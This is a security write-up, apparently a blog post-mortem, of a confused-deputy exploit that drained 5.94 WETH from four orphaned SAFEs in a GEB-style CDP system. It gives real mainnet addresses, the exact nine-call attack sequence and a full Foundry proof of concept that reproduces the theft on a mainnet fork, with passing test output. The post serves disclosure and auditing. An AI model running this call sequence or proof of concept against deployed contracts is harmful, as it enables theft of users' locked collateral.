---
title: "GEB CDP positions drained for 5.94 WETH by calling GebProxyActions directly instead of via delegatecall"
date: 2026-09-03T07:32:50+08:00
draft: false
author: yinhui
categories: ["security"]
tags: ["attack"]
description: "A confused-deputy bug in a GEB-framework CDP system: a delegatecall-only helper contract got called directly once in its history, and that let anyone permanently impersonate the recorded owner of four SAFEs for 5.94 WETH."
---

A CDP system built on the GEB framework — the same architecture family MakerDAO's `DssProxyActions` and Reflexer's RAI popularized — lost about 5.94 WETH in a single transaction to a bug that has nothing to do with price manipulation, flash loans, or reentrancy. It's a plain identity mixup between `delegatecall` and a regular `CALL`, sitting in a helper contract that was never supposed to hold any state of its own in the first place.

Transaction: `0xfbce28e35c26358110dd9ed91f9ceef588acb264c3cf6c573df65ca21335058f`

<!--more-->

## The setup

GEB-style CDP systems split their logic into a core ledger (`SAFEEngine`), a SAFE (CDP) registry (`GebSafeManager`), a settlement module for winding the system down (`GlobalSettlement`), collateral adapters (`CollateralJoin1` for WETH), and a pile of convenience wrappers users interact with day to day. The one that matters here is `GebProxyActions`.

```
SAFEEngine:        0xf0b7808b940b78be81ad6f9e075ce8be4a837e2c
GebSafeManager:     0xdf88b73462abd08f145b4b31edf4966c7129b255
GlobalSettlement:   0x4d37ef04724fec8b80aab3f6b7e7f4ef4181d9a9
CollateralJoin1:    0xE843783144AcDf485Ff86D726bCb67dD316e0BBE
GebProxyActions:    0x84FE452d9fb495A335C74a225e6AD52C35eB8616
WETH:               0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
```

All five are verified on Etherscan. The affected positions are SAFE ids 3, 5, 8, and 18, all backed by ETH-A collateral.

`GebProxyActions` is stateless. It holds no balances, tracks no ownership, has no `onlyOwner` anywhere. That's by design — it's meant to be used exactly once per user, via their own personal proxy wallet (a DSProxy), which `delegatecall`s into it. Under `delegatecall`, `address(this)` inside `GebProxyActions`' code resolves to the *caller's* proxy address, not the library's own address. So when a function does something like open a SAFE and hand ownership to `address(this)`, it's really handing ownership to the user's proxy, which is exactly what you want.

The source even has the warning spelled out: some of these functions are unsafe if you call them directly. Direct meaning a plain `CALL` instead of a `delegatecall`. Worth sitting with that sentence for a second, because it's the whole vulnerability in one line.

## What went wrong

At some point in this deployment's history, something called `GebProxyActions` with a plain `CALL` instead of routing through a proxy's `delegatecall` — while opening SAFE ids 3, 5, 8, and 18. Under a plain call, `address(this)` no longer resolves to a user's proxy. It resolves to `GebProxyActions` itself. So `GebSafeManager.openSAFE` recorded the *library's own address* as the owner (`ownsSAFE`) of all four SAFEs.

That's already bad on its own — four real, collateralized positions with debt and locked ETH, "owned" by a contract with no owner, no access control, nothing guarding it. But it gets worse, because `GebSafeManager`'s ownership check is exactly what you'd expect:

```solidity
modifier safeAllowed(uint safe) {
    require(msg.sender == ownsSAFE[safe] || safeCan[ownsSAFE[safe]][safe][msg.sender] == 1, "safe-not-allowed");
    _;
}
```

`msg.sender == ownsSAFE[safe]`. If `ownsSAFE[safe]` is `GebProxyActions`' own address, then this check passes for anyone who gets `GebProxyActions` to be `msg.sender` when it calls into `GebSafeManager` — which is trivial, because that's just calling `GebProxyActions` directly again, the exact same "mistake" that created the bug in the first place, except this time on purpose.

`GebProxyActions.quitSystem` is a one-line passthrough:

```solidity
function quitSystem(address manager, uint safe, address dst) public {
    ManagerLike(manager).quitSystem(safe, dst);
}
```

No modifier, no check, nothing stopping anyone from calling this directly with any `dst` they want. Call it as a plain `CALL`, and `GebSafeManager` sees `msg.sender = GebProxyActions`, which is precisely the value sitting in `ownsSAFE[3]`, `ownsSAFE[5]`, `ownsSAFE[8]`, and `ownsSAFE[18]`.

## Attack flow

The system had already gone through global settlement by the time this happened — both `SAFEEngine` and `GlobalSettlement` had `contractEnabled = 0` — which actually makes the exit path simpler, because settlement exits are permissionless by design. No governance action needed, no privileged role. Just two free, self-service calls to line things up, then a walk through settlement for each of the four SAFEs.

First, two setup calls, both free and callable by anyone on their own behalf:

```
SAFEEngine.approveSAFEModification(GebSafeManager)
GebSafeManager.allowHandler(GebProxyActions, 1)
```

The first grants `GebSafeManager` consent to move the caller's own SAFE position — needed because the internal transfer function checks consent on *both* sides of a transfer, and only the destination side (the attacker) was missing it. The second satisfies a handler-permission check on the same path.

Then, for each of the four SAFEs, in order:

```
GlobalSettlement.processSAFE(ETH-A, <safe's internal handler address>)
GebProxyActions.quitSystem(GebSafeManager, safeId, attacker)
GlobalSettlement.freeCollateral(ETH-A)
```

`processSAFE` settles the position in place — zeroes its debt, confiscates whatever collateral is owed against that debt. `quitSystem`, called directly (not through a proxy), moves what's left — now debt-free — into the caller's own ledger position inside `SAFEEngine`, using exactly the confused-deputy path above. `freeCollateral` credits that into a withdrawable internal balance.

Last step, once per collateral type:

```
CollateralJoin1.exit(attacker, amount)
```

This turns the internal ledger balance into real, transferable WETH.

All nine calls, bundled into one transaction through a disposable contract the attacker deployed for the occasion. At the end, the contract unwraps the WETH into ETH and forwards it up the call chain to the actual attacker address.

## Proof of concept

Talk is cheap, so here's a Foundry test that forks mainnet at block 25883378 — one block before the real exploit — and walks the exact same path against the real deployed bytecode. Fresh test address, zero starting capital beyond gas, no replayed calldata from the real attacker's transaction:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import {Test, console2} from "forge-std/Test.sol";

interface IGebSafeManager {
    function ownsSAFE(uint256 safe) external view returns (address);
    function safes(uint256 safe) external view returns (address);
    function collateralTypes(uint256 safe) external view returns (bytes32);
    function allowHandler(address usr, uint256 ok) external;
}

interface IGebProxyActions {
    function quitSystem(address manager, uint256 safe, address dst) external;
}

interface ISAFEEngine {
    function approveSAFEModification(address account) external;
    function canModifySAFE(address safe, address account) external view returns (bool);
    function safes(bytes32 collateralType, address safe) external view returns (uint256 lockedCollateral, uint256 generatedDebt);
    function tokenCollateral(bytes32 collateralType, address account) external view returns (uint256);
    function collateralTypes(bytes32 collateralType)
        external
        view
        returns (uint256 debtAmount, uint256 accumulatedRate, uint256 safetyPrice, uint256 debtCeiling, uint256 debtFloor);
    function contractEnabled() external view returns (uint256);
}

interface IGlobalSettlement {
    function processSAFE(bytes32 collateralType, address safe) external;
    function freeCollateral(bytes32 collateralType) external;
    function finalCoinPerCollateralPrice(bytes32 collateralType) external view returns (uint256);
    function contractEnabled() external view returns (uint256);
}

interface ICollateralJoin1 {
    function exit(address usr, uint256 wad) external;
}

interface IERC20Min {
    function balanceOf(address account) external view returns (uint256);
}

contract SAFEEngineConfusedDeputyPoC is Test {
    uint256 internal constant FORK_BLOCK = 25883378;

    address internal constant SAFE_ENGINE = 0xf0b7808b940b78bE81ad6F9E075Ce8be4A837E2c;
    address internal constant GEB_SAFE_MANAGER = 0xdF88b73462abD08f145b4b31edf4966C7129B255;
    address internal constant GLOBAL_SETTLEMENT = 0x4d37Ef04724fec8b80AAB3F6B7e7F4ef4181D9a9;
    address internal constant COLLATERAL_JOIN_1 = 0xE843783144AcDf485Ff86D726bCb67dD316e0BBE;
    address internal constant PA = 0x84FE452d9fb495A335C74a225e6AD52C35eB8616;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    bytes32 internal constant ETH_A = "ETH-A";

    uint256[4] internal ORPHAN_SAFE_IDS = [uint256(3), 5, 8, 18];

    // Obtained via `cast call GebSafeManager "safes(uint256)(address)" <id>`
    // against the fork block — asserted again inside the test, not trusted blindly.
    address internal constant HANDLER_3 = 0xf524b4DfCC8D5c811CC3202Cea6435b52A09dd1b;
    address internal constant HANDLER_5 = 0xfC4462a862e9d9592768c897A5Fb45c4848A9423;
    address internal constant HANDLER_8 = 0x90a5cFF177377e78410Bee4834a6a6D8C2Dd25A8;
    address internal constant HANDLER_18 = 0xbFB283923541E4C726fd58D6480f0dDAD556a581;

    // The real historical attack's exact figure, matching the on-chain
    // WETH `Transfer` event. Getting this to the wei depends on doing
    // processSAFE before quitSystem, per SAFE, not batched — more on that
    // below the loop.
    uint256 internal constant EXPECTED_LOOT_WEI = 5_943_599_831_844_387_377;

    function testConfusedDeputyDrainsFourOrphanedSAFEs() external {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);

        IGebSafeManager manager = IGebSafeManager(GEB_SAFE_MANAGER);
        ISAFEEngine safeEngine = ISAFEEngine(SAFE_ENGINE);
        IGlobalSettlement globalSettlement = IGlobalSettlement(GLOBAL_SETTLEMENT);

        address attacker = makeAddr("attacker");

        // ---- preconditions ---------------------------------------------------
        assertEq(safeEngine.contractEnabled(), 0, "pre: SAFEEngine already shut down");
        assertEq(globalSettlement.contractEnabled(), 0, "pre: GlobalSettlement already shut down");

        address[4] memory expectedHandlers = [HANDLER_3, HANDLER_5, HANDLER_8, HANDLER_18];
        for (uint256 i = 0; i < 4; i++) {
            uint256 id = ORPHAN_SAFE_IDS[i];
            assertEq(manager.ownsSAFE(id), PA, "pre: ownsSAFE == GebProxyActions (orphaned)");
            assertEq(manager.safes(id), expectedHandlers[i], "pre: handler matches independently-queried address");
            assertEq(manager.collateralTypes(id), ETH_A, "pre: collateral type is ETH-A");
        }
        assertTrue(safeEngine.canModifySAFE(HANDLER_3, GEB_SAFE_MANAGER), "pre: handler already trusts its own manager");
        assertFalse(safeEngine.canModifySAFE(attacker, GEB_SAFE_MANAGER), "pre: attacker has NOT yet approved the manager");

        // ---- negative control: zero pre-steps must revert --------------------
        {
            uint256 snap = vm.snapshotState();
            vm.prank(attacker);
            vm.expectRevert(bytes("internal-system-safe-not-allowed"));
            IGebProxyActions(PA).quitSystem(GEB_SAFE_MANAGER, 3, attacker);
            vm.revertToState(snap);
        }

        // ---- step 1: attacker self-service, allow PA as a handler ------------
        vm.prank(attacker);
        manager.allowHandler(PA, 1);

        // ---- negative control: step 1 alone, without step 2, must revert -----
        {
            uint256 snap = vm.snapshotState();
            vm.prank(attacker);
            vm.expectRevert(bytes("SAFEEngine/not-allowed"));
            IGebProxyActions(PA).quitSystem(GEB_SAFE_MANAGER, 3, attacker);
            vm.revertToState(snap);
        }

        // ---- step 2: attacker self-service, approve the manager --------------
        vm.prank(attacker);
        safeEngine.approveSAFEModification(GEB_SAFE_MANAGER);
        assertTrue(safeEngine.canModifySAFE(attacker, GEB_SAFE_MANAGER), "post: attacker now trusts the manager");

        // ---- steps 3-5, once per SAFE: processSAFE -> quitSystem -> freeCollateral
        // processSAFE runs on the HANDLER's own address, BEFORE quitSystem
        // moves anything out — that's the order the real attacker used.
        // Batching all 4 quitSystem calls first and settling the merged
        // position afterward is a different, equally valid zero-privilege
        // variant, but it rounds 2 wei lower, because processSAFE's
        // internal rmultiply() truncates on division, and truncating
        // division over one merged sum isn't the same as truncating
        // division over four separate amounts.
        for (uint256 i = 0; i < 4; i++) {
            uint256 id = ORPHAN_SAFE_IDS[i];
            address handler = expectedHandlers[i];

            vm.prank(attacker);
            globalSettlement.processSAFE(ETH_A, handler);
            (uint256 handlerLockedAfterProcess, uint256 handlerDebtAfterProcess) = safeEngine.safes(ETH_A, handler);
            assertEq(handlerDebtAfterProcess, 0, "post-process: handler debt zeroed in place");

            (uint256 attackerLockedBeforeQuit,) = safeEngine.safes(ETH_A, attacker);
            vm.prank(attacker);
            IGebProxyActions(PA).quitSystem(GEB_SAFE_MANAGER, id, attacker);
            (uint256 handlerLockedAfterQuit, uint256 handlerDebtAfterQuit) = safeEngine.safes(ETH_A, handler);
            (uint256 attackerLockedAfterQuit,) = safeEngine.safes(ETH_A, attacker);
            assertEq(handlerLockedAfterQuit, 0, "post-quit: handler locked collateral drained to 0");
            assertEq(handlerDebtAfterQuit, 0, "post-quit: handler debt still 0");
            assertEq(
                attackerLockedAfterQuit - attackerLockedBeforeQuit,
                handlerLockedAfterProcess,
                "quitSystem moved exactly the post-process remainder, no more no less"
            );

            vm.prank(attacker);
            globalSettlement.freeCollateral(ETH_A);
        }

        uint256 freedTokenCollateral = safeEngine.tokenCollateral(ETH_A, attacker);
        assertEq(freedTokenCollateral, EXPECTED_LOOT_WEI, "freed collateral matches the real historical attack's figure to the wei");

        // ---- step 6: cash out to real WETH ------------------------------------
        uint256 attackerWethBefore = IERC20Min(WETH).balanceOf(attacker);
        uint256 joinWethBefore = IERC20Min(WETH).balanceOf(COLLATERAL_JOIN_1);

        vm.prank(attacker);
        ICollateralJoin1(COLLATERAL_JOIN_1).exit(attacker, freedTokenCollateral);

        uint256 attackerWethAfter = IERC20Min(WETH).balanceOf(attacker);
        uint256 joinWethAfter = IERC20Min(WETH).balanceOf(COLLATERAL_JOIN_1);

        assertEq(attackerWethAfter - attackerWethBefore, EXPECTED_LOOT_WEI, "attacker received exactly the expected loot in real WETH");
        assertEq(joinWethBefore - joinWethAfter, EXPECTED_LOOT_WEI, "CollateralJoin1's real WETH reserve dropped by exactly the same amount");
        assertEq(safeEngine.tokenCollateral(ETH_A, attacker), 0, "attacker's internal ledger balance drained to 0 after exit");

        console2.logUint(attackerWethAfter - attackerWethBefore);
    }
}
```

`forge test -vv` against an archive RPC pinned to block 25883378:

```
Compiling 20 files with Solc 0.8.23
Solc 0.8.23 finished in 2.15s
Compiler run successful!

Ran 1 test for test/SAFEEngineConfusedDeputyPoC.t.sol:SAFEEngineConfusedDeputyPoC
[PASS] testConfusedDeputyDrainsFourOrphanedSAFEs() (gas: 520662)
Logs:
  == STEP 0: preconditions ==
  all 4 SAFEs confirmed orphaned (ownsSAFE == GebProxyActions)
  negative control confirmed: quitSystem reverts with zero pre-steps (internal-system-safe-not-allowed)
  == STEP 1: GebSafeManager.allowHandler(PA, 1) ==
  negative control confirmed: quitSystem reverts with step 1 alone (SAFEEngine/not-allowed)
  == STEP 2: SAFEEngine.approveSAFEModification(GebSafeManager) ==
  -- SAFE loop iteration --
  -- SAFE loop iteration --
  -- SAFE loop iteration --
  -- SAFE loop iteration --
  attacker tokenCollateral balance after 4x (processSAFE->quitSystem->freeCollateral):
  5943599831844387377
  == STEP 6: CollateralJoin1.exit(attacker, amount) ==
  LOOT (real WETH received by a zero-privilege, zero-capital attacker):
  5943599831844387377

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.39s (672.98ms CPU time)

Ran 1 test suite in 2.71s (2.39s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

`5943599831844387377` wei, twice — once from the internal ledger balance, once from the real WETH transfer — matching the on-chain `Transfer` event to the wei. Both negative controls revert exactly where the source predicts they should.

## Result

`5,943,599,831,844,387,377` wei of WETH moved out — about 5.9436 WETH, matching the on-chain `Transfer` event on `CollateralJoin1`'s balance exactly. Zero starting capital beyond gas, zero privileged access, one transaction, and the numbers above weren't hand-derived — they came straight out of a passing test run against the real deployed bytecode.

## The general lesson

This isn't really a bug in `GebProxyActions`' logic. Every function does what it says. The problem is a security assumption — "I will only ever be reached via `delegatecall`" — that lives entirely in a code comment and nowhere in the EVM's actual guarantees. Nothing about `delegatecall` vs `CALL` is visible or checkable from inside the callee. A stateless library that trusts `address(this)`/`msg.sender` to always mean "the calling proxy" has no way to notice when that assumption breaks, because from its own point of view, both cases look completely normal.

This is a recurring shape across the MakerDAO/RAI/GEB family and anywhere else the same "shared, stateless, delegatecall-only library" pattern shows up: `DssProxyActions` and its many forks use it for exactly the same reason `GebProxyActions` does here, and the pattern is common enough elsewhere that it's worth generalizing past this one incident. The convention only has to be violated once, by any caller, anywhere in the system's history — a misconfigured integration, a wrapper contract written by someone who didn't read the warning comment, doesn't matter — and the library's own address becomes a standing, zero-cost, permanently reusable identity for whatever it happened to be doing at that moment. Nothing about the library itself needs to change for that identity to stay exploitable forever afterward, because the library was never supposed to need access control in the first place.

If you're auditing a system like this, the check isn't "does this function have the right modifier" — it does, by its own logic. It's "what happens to every piece of state this contract can write, if `address(this)` or `msg.sender` inside it ever resolves to something other than what the design assumes." That question doesn't have an answer inside the contract's own code. It only has an answer once you go check who has actually called it, historically, and how.
